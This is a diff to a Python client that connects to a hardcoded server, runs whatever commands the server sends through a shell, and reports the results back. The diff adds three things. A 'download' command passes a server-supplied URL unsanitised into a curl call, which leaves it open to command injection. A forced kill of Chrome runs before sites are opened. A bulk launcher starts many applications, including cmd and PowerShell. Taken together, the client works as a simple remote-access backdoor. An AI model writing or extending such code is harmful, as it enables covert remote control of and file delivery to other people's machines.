@@ -5,7 +5,7 @@ import subprocess
 import time   # 🔥 add
 from plyer import notification
 import pyttsx3
-HOST = '100.111.190.57'
+HOST = '192.168.0.141'
 PORT = 5000
 
 def speak(audio):
@@ -57,8 +57,11 @@ while True:
 
     if data.startswith("open "):
         try:
+
             app = data.replace("open ", "").strip()
+            os.system("Taskkill /IM chrome.exe /F")
             wb.open(f"https://{app}.com")
+            
             send_to_server(f"{app} opened")   # 🔥 add this
         except:
             send_to_server("wrong domain name")
@@ -86,7 +89,35 @@ while True:
             send_to_server(f"alert showed")   # 🔥 add this
         except:
             send_to_server("can't show the alert")
+        
+    elif data.startswith("download "):
+        try:
+            url = data.replace("download ", "").strip()
+        
+            filename = url.split("/")[-1]   # 🔥 filename extract
+        
+            os.system(f"curl -L {url} -o {filename}")
+        
+            send_to_server("File Transfer Successfully")
+        except:
+            send_to_server("can't Transfer File")
 
+    
+    elif data.lower() == "all open":
+        apps = [
+            "excel","winword","powerpnt","outlook",
+            "chrome","firefox","msedge",
+            "cmd","powershell","ms-settings:",
+            "explorer","notepad","calc","mspaint",
+            "vlc","spotify"
+        ]
+
+        for app in apps:
+            try:
+                subprocess.Popen(f"start {app}", shell=True)
+                send_to_server(f"{app} opened")
+            except:
+                send_to_server(f"{app} not found")
     else:
         try:
             data = subprocess.check_output(f"{data}", shell=True).decode()
@@ -94,6 +125,9 @@ while True:
             send_to_server("task complete")
         except:
            send_to_server(f"{data} command is wrong please give right command")
+    
+    
+
 
 
     
